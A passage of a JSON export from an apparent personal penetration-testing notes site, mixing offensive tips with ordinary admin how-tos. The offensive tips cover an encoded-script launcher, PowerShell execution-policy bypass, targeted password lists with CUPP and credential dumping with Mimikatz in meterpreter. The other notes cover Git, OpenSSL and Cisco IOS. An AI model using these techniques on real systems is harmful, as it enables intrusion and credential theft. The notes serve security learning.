style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;BASE64_ENCODED_SCRIPT_TO_RUN&quot;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t\t\tP.StartInfo = SI;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t\t\tP.Start();&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t\t}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;@&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Add-Type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;outputtype consoleapplication &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;outputassembly &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;BINARY_NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;TypeDefinition &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;code&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Language CSharp&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Bypass-the-PowerShell-execution-policy":{"slug":"spells/Bypass-the-PowerShell-execution-policy","filePath":"spells/Bypass the PowerShell execution policy.md","title":"Bypass the PowerShell execution policy","links":[],"tags":["Application/PowerShell","OS/Windows","HowTo","AttackCycle/Exploitation"],"content":"The PowerShell execution policy can be bypassed on a case-by-case basis using -ex bypass; for example:\npowershell -ex bypass -File $FILE.ps1\n\n\n                  \n                  Tip\n                  \n                \n\n\nThe -ex bypass flag isn’t necessary when executing code directly with -c.\n\n\n\nThis can also be set temporarily within a shell:\nSet-ExecutionPolicy Bypass -Scope process -Force\nHowever, this will not bypass other protections, in particular AMSI!","richContent":"&lt;p&gt;The PowerShell execution policy can be bypassed on a case-by-case basis using &lt;code&gt;-ex bypass&lt;/code&gt;; for example:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;powershell &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ex bypass &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;File &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;FILE.ps1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;blockquote class=&quot;callout tip&quot; data-callout=&quot;tip&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Tip&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;The &lt;code&gt;-ex bypass&lt;/code&gt; flag &lt;em&gt;isn’t&lt;/em&gt; necessary when executing code directly with &lt;code&gt;-c&lt;/code&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;This can also be set temporarily within a shell:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Set-ExecutionPolicy&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; Bypass &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Scope &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;process&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Force&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;However, this will not bypass other protections, in particular AMSI!&lt;/p&gt;"},"spells/CUPP":{"slug":"spells/CUPP","filePath":"spells/CUPP.md","title":"CUPP","links":[],"tags":["Application/CUPP","OS/Linux/Distros/Kali","AttackCycle/Exploitation/BruteForcing"],"content":"The Common User Passwords Profiler (sudo apt install cupp on Kali Linux) can generate potential password lists based on personal data (birthday, pet’s name, etc.). It can be run in an automated fashion, or will ask you appropriate questions for a specific target when invoked as cupp -I.\nUsing cupp -l will also download pre-created lists in a variety of languages.\nUsing cupp -a will download lists of known default passwords.","richContent":"&lt;p&gt;The &lt;strong&gt;Common User Passwords Profiler&lt;/strong&gt; (&lt;code&gt;sudo apt install cupp&lt;/code&gt; on Kali Linux) can generate potential password lists based on personal data (birthday, pet’s name, etc.). It can be run in an automated fashion, or will ask you appropriate questions for a specific target when invoked as &lt;code&gt;cupp -I&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;Using &lt;code&gt;cupp -l&lt;/code&gt; will also download pre-created lists in a variety of languages.&lt;/p&gt;\n&lt;p&gt;Using &lt;code&gt;cupp -a&lt;/code&gt; will download lists of known default passwords.&lt;/p&gt;"},"spells/Calculate-a-file-hash-on-Windows-with-CertUtil":{"slug":"spells/Calculate-a-file-hash-on-Windows-with-CertUtil","filePath":"spells/Calculate a file hash on Windows with CertUtil.md","title":"Calculate a file hash on Windows with CertUtil","links":[],"tags":["HowTo","OS/Windows","Application/CertUtil","Cryptography/Hashes/SHA1"],"content":"CertUtil -hashfile $FILE_PATH $ALGORITHM\nThe algorithm can be excluded (in which case SHA1 is used).","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;CertUtil &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;hashfile &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;FILE_PATH&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;ALGORITHM&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The algorithm can be excluded (in which case SHA1 is used).&lt;/p&gt;"},"spells/Call-Mimikatz-from-a-meterpreter-shell":{"slug":"spells/Call-Mimikatz-from-a-meterpreter-shell","filePath":"spells/Call Mimikatz from a meterpreter shell.md","title":"Call Mimikatz from a meterpreter shell","links":["spells/Mimikatz"],"tags":["Application/Metasploit/meterpreter","OS/Windows/ActiveDirectory","Protocol/Kerberos","AttackCycle/PrivEsc","AttackCycle/LateralMovement","AttackCycle/Exploitation"],"content":"Use load kiwi to load up Mimikatz. Sub-commands:\nkerberos         # Attempt to retrieve kerberos creds\nlivessp          # Attempt to retrieve livessp creds\nmimikatz_command # Run a custom commannd\nmsv              # Attempt to retrieve msv creds (hashes)\nssp              # Attempt to retrieve ssp creds\ntspkg            # Attempt to retrieve tspkg creds\nwdigest          # Attempt to retrieve wdigest creds","richContent":"&lt;p&gt;Use &lt;code&gt;load kiwi&lt;/code&gt; to load up &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Mimikatz&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Mimikatz&quot;&gt;Mimikatz&lt;/a&gt;. Sub-commands:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;meterpreter&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;meterpreter&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;kerberos         # Attempt to retrieve kerberos creds&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;livessp          # Attempt to retrieve livessp creds&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;mimikatz_command # Run a custom commannd&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;msv              # Attempt to retrieve msv creds (hashes)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;ssp              # Attempt to retrieve ssp creds&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;tspkg            # Attempt to retrieve tspkg creds&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;wdigest          # Attempt to retrieve wdigest creds&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Change-a-branch-name-in-Git":{"slug":"spells/Change-a-branch-name-in-Git","filePath":"spells/Change a branch name in Git.md","title":"Change a branch name in Git","links":[],"tags":["Application/Git","HowTo"],"content":"git checkout -b trunk master # Create and switch to the trunk branch\ngit push -u origin trunk     # Push the trunk branch to the remote and\n                             # track it\ngit branch -d master         # Delete local master\n \n# Log into Bitbucket, go to the &quot;Repository settings&quot;, and change the\n# &quot;Main branch&quot; from &quot;master&quot; to &quot;trunk&quot;.\n#\ngit push --delete origin master # Delete remote master\ngit remote prune origin         # Delete the remote tracking branch\n\n\n                  \n                  Note\n                  \n                \n\n\nGitHub deciding to switch “master” to “main” makes no sense to me. We talk about git “branches” and working “trees”. Shouldn’t the central branch in a git tree be the “trunk”?\n\n\n","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;git&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; checkout&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -b&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; trunk&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; master&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # Create and switch to the trunk branch&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;git&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; push&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; origin&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; trunk&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;     # Push the trunk branch to the remote and&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;                             # track it&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;git&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; branch&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; master&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;         # Delete local master&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Log into Bitbucket, go to the &quot;Repository settings&quot;, and change the&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# &quot;Main branch&quot; from &quot;master&quot; to &quot;trunk&quot;.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;git&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; push&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --delete&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; origin&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; master&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # Delete remote master&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;git&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; remote&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; prune&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; origin&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;         # Delete the remote tracking branch&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;GitHub deciding to switch “master” to “main” makes no sense to me. We talk about git “branches” and working “trees”. Shouldn’t the central branch in a git tree be the “trunk”?&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;"},"spells/Change-an-RSA-key-passphrase-with-OpenSSL":{"slug":"spells/Change-an-RSA-key-passphrase-with-OpenSSL","filePath":"spells/Change an RSA key passphrase with OpenSSL.md","title":"Change an RSA key passphrase with OpenSSL","links":[],"tags":["HowTo","Application/OpenSSL","Cryptography/Cryptosystems/RSA"],"content":"To change a passphrase:\nopenssl rsa -des3 -in $OLD_KEY -out $NEW_KEY\nTo remove a passphrase:\nopenssl rsa -in $OLD_KEY -out $NEW_KEY\nTo check that a passphrase is correct:\nopenssl rsa -check -in $NEW_KEY","richContent":"&lt;p&gt;To change a passphrase:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; rsa&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -des3&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $OLD_KEY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -out&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $NEW_KEY&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;To remove a passphrase:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; rsa&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $OLD_KEY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -out&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $NEW_KEY&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;To check that a passphrase is correct:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; rsa&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -check&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $NEW_KEY&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Cisco-IOS":{"slug":"spells/Cisco-IOS","filePath":"spells/Cisco IOS.md","title":"Cisco IOS","links":[],"tags":["OS/CiscoIOS"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from slyth11907 / Cheatsheets / Cheatsheet_CiscoIOS.txt.\n\n\n\nSystem information\n######################\n# System information #\n######################\n \nshow version                 # Software &amp; hardware information\nshow running-config          # Current configuration\nshow startup-config          # Boot configuration\nshow history                 # Command history buffer\nshow ip interface brief      # Interface overview\nshow interface $TYPE $NUM    # Detailed interface information\nshow interfaces description  # Interface descriptions\nshow interfaces status       # Status of all interfaces\nshow crypto key mypubkey rsa # Current SSH public key\nshow dhcp lease              # Current DHCP status/information\n \n######################\n# Configuration mode #\n######################\n \nconfig           # General configuration mode\nconfig interface # Interface configuration mode\nconfig line      # Serial console configuration mode\n \n# General configuration commands\n#\nhostname $HOSTNAME                 # Set switch hostname\nenable secret $MD5_PASS            # Set password using MD5 hash \nenable password $PASSWORD          # Set password using clear text\nbanner motd $BANNER                # Set login banner (use &quot;$&quot; like &quot;EOF&quot;)\nip default-gateway $IP_ADDRESS     # Set default gateway\ncopy running-config startup-config # Persiste current config\n \n# Network interface configuration\n#\ninterface $IFACE_TYPE $IFACE_NUM\nip address $IP_ADDRESS $NETMASK\n \n# Login (&quot;line&quot;) configuration - set console port\n#\nline con 0\npassword $PASSWORD\nlogin\n \n# Login (&quot;line&quot;) configuration - set terminal connections\n#\nconfig\nline vty 0 $VTTY_NUM\npassword $PASSWORD\nlogin","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://github.com/slyth11907/Cheatsheets/blob/master/Cheatsheet_CiscoIOS.txt&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;slyth11907 / Cheatsheets / Cheatsheet_CiscoIOS.txt&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=&quot;system-information&quot;&gt;System information&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#system-information&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;######################&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# System information #&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;######################&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;show&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; version&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;                 # Software &amp;#x26; hardware information&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;show&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; running-config&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;          # Current configuration&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;show&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; startup-config&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;          # Boot configuration&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;show&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; history&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;                 # Command history buffer&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;show&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ip&lt;/span&gt;&lt;span 